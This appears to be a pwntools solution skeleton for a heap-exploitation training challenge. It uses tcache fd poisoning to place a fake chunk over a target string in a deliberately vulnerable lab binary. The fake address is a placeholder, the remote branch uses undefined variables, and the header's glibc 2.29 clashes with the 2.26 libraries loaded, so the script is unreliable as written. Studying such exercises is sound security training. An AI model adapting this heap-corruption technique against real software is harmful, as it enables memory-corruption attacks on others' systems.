'''
Tcache Fake Fd Challenge writeup:
- Run on GLibC version 2.29
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.26/libc-2.26.so'
env = {}

# Binary setup
elf_name = '.fake_fd-2.26' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.26/
''') 
else: 
	p = remote(domain, port) 

''''
Challenge: 
Put the fake chunk over the top of 'important_string' 
If you change this value, you win :) 

Use the fd poisioning technique we have just discussed
'''
fake_fd_location = 0x22222222222
print hex(fake_fd_location) 
p.sendlineafter("Data:", p64(fake_fd_location) )


value = "Hackerman" 
p.sendlineafter("victim:", value) 
p.interactive()

